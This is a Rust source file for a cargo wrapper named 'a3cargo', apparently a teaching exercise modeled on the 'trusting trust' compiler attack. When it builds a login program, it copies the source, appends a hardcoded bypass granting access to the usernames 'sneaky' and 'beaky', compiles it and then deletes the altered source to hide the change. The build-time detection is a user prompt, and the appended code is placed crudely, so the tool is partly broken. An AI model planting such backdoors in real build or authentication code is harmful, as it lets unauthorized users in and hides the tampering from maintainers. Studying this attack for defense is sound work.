use std::{
    env, fs, io::{self, Write}, path::Path, process::{Command, exit}
};

fn main() {
    if is_running_in_a3login() {
        println!("Running within a3login. Proceeding with special build...");

        // Step 1: Copy a3login to bd_a3login
        let _ = fs::copy("a3login.rs", "bd_a3login.rs")
            .expect("Failed to copy a3login to bd_a3login.");

        // Step 2: Modify bd_a3login to accept "sneaky" and "beaky"
        modify_bd_a3login();

        // Step 3: Compile the modified version using Cargo
        compile_bd_a3login();

        // Step 4: Clean up - delete the modified source file
        fs::remove_file("bd_a3login.rs")
            .expect("Failed to delete bd_a3login.rs after compilation.");

        println!("Modified a3login built and cleaned up successfully.");
    } else {
        println!("Not running within a3login. Building with Cargo normally...");
        build_with_cargo();
    }

    println!("Exiting a3cargo.");
}

fn is_running_in_a3login() -> bool {
    // Implement logic to determine if a3cargo is running in a3login
    // For now, we simulate it with a user input (this can be replaced with more complex checks)
    print!("Is a3cargo running within a3login? (yes/no): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).expect("Failed to read input");
    input.trim().eq_ignore_ascii_case("yes")
}

fn modify_bd_a3login() {
    // Example modification: append sneaky/beaky handling to bd_a3login.rs
    let mut content = fs::read_to_string("bd_a3login.rs")
        .expect("Failed to read bd_a3login.rs");
    
    content.push_str(
        r#"
        // Added sneaky and beaky login handling
        if username == "sneaky" || username == "beaky" {
            println!("Access granted for sneaky or beaky!");
            return;
        }
        "#,
    );

    fs::write("bd_a3login.rs", content)
        .expect("Failed to write modifications to bd_a3login.rs.");
}

fn compile_bd_a3login() {
    let status = Command::new("cargo")
        .args(&["build", "--bin", "bd_a3login"])
        .status()
        .expect("Failed to compile bd_a3login with cargo.");

    if !status.success() {
        eprintln!("Failed to compile bd_a3login.");
        exit(1);
    }
}

fn build_with_cargo() {
    let status = Command::new("cargo")
        .arg("build")
        .status()
        .expect("Failed to build with cargo.");

    if !status.success() {
        eprintln!("Cargo build failed.");
        exit(1);
    }
}